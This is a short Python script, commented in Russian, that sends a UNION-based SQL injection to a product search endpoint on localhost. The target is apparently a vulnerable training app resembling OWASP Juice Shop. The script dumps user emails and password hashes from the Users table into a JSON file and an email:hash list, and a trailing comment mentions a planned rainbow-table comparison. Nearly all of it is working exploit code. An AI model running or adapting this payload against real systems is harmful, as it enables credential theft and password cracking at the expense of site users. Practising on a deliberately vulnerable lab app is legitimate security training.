import requests
import time
import json

#переходим на страницу, вставляем SQLi, отправляем статус код в терминал

r1 = requests.get('http://localhost:3000/rest/products/search?q=')
payload = "qwert')) UNION SELECT id, email, password, '4', '5', '6', '7', '8', '9' FROM Users--"
time.sleep(0.3)
r = requests.get('http://localhost:3000/rest/products/search?q=' + payload)
status_code_page_sql = r.status_code
print(status_code_page_sql)

#сохраняем базу данных в файл full_database.json

with open('full_database.json', 'wb') as db_json_load:
    db_json_load.write(r.content)

#назначаем данные из базы данных как переменную

with open('full_database.json', 'r') as db_json_save:
    full_database = json.load(db_json_save)

#добавляем отступы в файле full_database.json

with open('full_database.json', 'w') as fix:
    json.dump(full_database, fix, indent=4)

#записываем данные в файл email_hashes.txt в формате email:pass

with open('email_hashes.txt', 'w') as result_file:
    for user in full_database.get('data',[]):
        email=user.get('name')
        hash=user.get('description')
        result_file.write(f"{email}:{hash}\n")



#сравнение с rainbow table/.. (-)